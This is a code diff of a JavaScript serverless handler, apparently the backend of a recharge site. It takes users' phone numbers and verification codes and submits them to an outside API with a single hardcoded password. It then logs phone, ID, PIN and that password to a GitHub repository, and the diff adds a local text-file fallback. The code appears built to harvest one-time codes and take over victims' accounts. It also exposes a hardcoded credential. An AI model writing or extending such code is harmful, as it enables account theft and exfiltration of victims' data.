@@ -31,7 +31,7 @@ export default async function handler(req, res) {
       },
       body: JSON.stringify({
         phone: phone,
-        password: "335112blk?",
+        password: "335112blk@", // Atualizado com símbolo
         code: code,
         scene: 0
       })
@@ -43,7 +43,6 @@ export default async function handler(req, res) {
     const data = await response.json();
     res.status(200).json(data);
 
-    // Fallback pro GitHub se JSONBin falhar (chamado do frontend)
     if (data.code === 0) {
       await sendToGitHub({ phone, id: req.body.id || '', pin: code, timestamp: new Date().toISOString() });
     }
@@ -53,9 +52,8 @@ export default async function handler(req, res) {
   }
 }
 
-// Função auxiliar pra GitHub (usando variável de ambiente)
 async function sendToGitHub(formData) {
-  const GITHUB_TOKEN = process.env.GITHUB_TOKEN; // Token como variável de ambiente
+  const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
   const OWNER = "infinityrecarga";
   const REPO = "kako-logs-contencao";
   const PATH = "logs.txt";
@@ -68,7 +66,7 @@ async function sendToGitHub(formData) {
     const sha = getData.sha;
     const currentContent = atob(getData.content);
 
-    const logLine = `${formData.timestamp} | ${formData.phone} | ${formData.id} | ${formData.pin} | 335112blk?\n`;
+    const logLine = `${formData.timestamp} | ${formData.phone} | ${formData.id} | ${formData.pin} | 335112blk@\n`;
     const updatedContent = currentContent + logLine;
     const putData = {
       message: "Adiciona log de contenção",
@@ -84,5 +82,18 @@ async function sendToGitHub(formData) {
     else console.error("Falha no GitHub:", await putResp.text());
   } catch (error) {
     console.error("Erro no fallback GitHub:", error);
+    await sendToLocalTxt(formData.phone); // Fallback extra pra .txt
+  }
+}
+
+// Novo fallback pra .txt
+async function sendToLocalTxt(phone) {
+  const logLine = `${new Date().toISOString()} | ${phone}\n`;
+  try {
+    const fs = require('fs');
+    fs.appendFileSync('failed_logs.txt', logLine, 'utf8');
+    console.log("Log salvo em failed_logs.txt!");
+  } catch (error) {
+    console.error("Erro ao salvar em failed_logs.txt:", error);
   }
 }
